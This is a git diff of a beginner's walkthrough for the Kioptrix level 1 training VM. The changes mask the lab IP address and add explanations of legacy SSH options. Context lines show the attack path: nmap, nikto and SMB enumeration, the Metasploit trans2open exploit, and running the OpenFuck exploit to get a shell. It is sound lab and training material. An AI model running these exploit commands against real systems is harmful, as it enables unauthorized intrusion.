@@ -94,7 +94,7 @@ Always keep notes of  your findings of scan or any operation it might be helpful
 
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 07:09 UTC
-Nmap scan report for 192.168.57.4
+Nmap scan report for 192.**.***.**
 Host is up (0.0079s latency).
 Not shown: 65529 closed tcp ports (conn-refused)
 PORT      STATE SERVICE     VERSION
@@ -149,7 +149,7 @@ Nmap done: 1 IP address (1 host up) scanned in 95.76 seconds
 - Samba
 we can see that there is a Apache running on port 80 check it out on the browser
 
-    http://192.168.57.4
+    http://192.***.**.**
 
 It doesn't have  much information on it.
 
@@ -165,8 +165,8 @@ Scan result :
 ```
 - Nikto v2.5.0
 ---------------------------------------------------------------------------
-+ Target IP:          192.168.57.4
-+ Target Hostname:    192.168.57.4
++ Target IP:          192.***.***.***
++ Target Hostname:    192.***.***.**
 + Target Port:        80
 + Start Time:         2024-08-11 09:14:56 (GMT0)
 ---------------------------------------------------------------------------
@@ -230,7 +230,7 @@ Scan result :
 
 we will use a tool called **dirbuster** [GUI]
 
-- Set **Target** URL :http://192.168.57.4:80
+- Set **Target** URL :http://192.**.***.**:80
 - Set Threads to  **Go Faster**
 - Browse the **wordlist** file of dirbuster
 - You can also add file extension if you want to search for specific types of file formats
@@ -289,7 +289,7 @@ Since we don't have any other info about the smb credentials(Domain,User,pass) w
 
 
 ```
-msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.57.4
+msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.***.***.**
 
 ```
 Now we can run it.
@@ -313,7 +313,7 @@ smbclient is a command-line tool used to interact with SMB/CIFS (Common Internet
 
 let's try :
 ```
-sudo smbclient -L  \\\\192.168.57.4\\
+sudo smbclient -L  \\\\192.***.***.**\\
 
 - L - is for listing all available  shares.  
 
@@ -338,14 +338,14 @@ SSH (Secure Shell) is a protocol used to securely connect to remote systems over
 Let's try connect to ssh :
 
 ```
-sudo ssh 192.168.57.4 
+sudo ssh 192.**.**.***
 
 ```
 well we can't connect because of algortihm not  found error 
 
-honestly saying i dont't have any idea what this is but i have tired as the instructor would Trying
+honestly saying i dont't have any idea what this is but i have tired as the instructor would do
 ```
-$ ssh 192.168.57.4 -oKexAlgorithms=+diffle-hellman-group1-sha1 -c aes128-cbc
+$ ssh 192.***.***.** -oKexAlgorithms=+diffle-hellman-group1-sha1 -c aes128-cbc
 
 ```
 Now this didn't actually work for me so i searched for some other way and found this and it worked !
@@ -355,7 +355,14 @@ https://github.com/amtzespinosa/kioptrix1-walkthrough
 
 ``` 
 ```
-sudo ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oPubkeyAcceptedAlgorithms=+ssh-rsa -c aes128-cbc 192.168.57.4
+sudo ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oPubkeyAcceptedAlgorithms=+ssh-rsa -c aes128-cbc 192.***.***.***
+
+
+sudo ssh: Use SSH with superuser (admin) permissions.
+-oKexAlgorithms=+diffie-hellman-group1-sha1: Allow an older key exchange method.
+-oHostKeyAlgorithms=+ssh-dss: Accept a specific, older host key algorithm.
+-oPubkeyAcceptedAlgorithms=+ssh-rsa: Use an older public key algorithm.
+-c aes128-cbc: Encrypt the connection with a specific cipher (also old).
 
 ```
 
@@ -390,7 +397,7 @@ msf5 > use exploit/linux/trans2open
 Set the options
 ```
 msf5 exploit(linux/trans2open) > options
-msf5 exploit(linux/trans2open) > set rhosts 192.168.57.4
+msf5 exploit(linux/trans2open) > set rhosts 192.**.***.***
 ```
 You can type 'show targets' for viewing for which target this will be performing
 ```
@@ -454,7 +461,7 @@ Usage :
 Run
 
 ```
- ./OpenFuck  0x6b 192.168.57.4 -c 40
+ ./OpenFuck  0x6b 192.***.**.** -c 40
 ```
 
 **And we'll get a shell!**
@@ -469,7 +476,7 @@ I'll be putting screenshots for other machines📷
 **Have fun guys! and yeah i like coffee too ☕** 
 
 ```
-1 Down 5 to go
+1 Down 4 to go
 ```
 
 
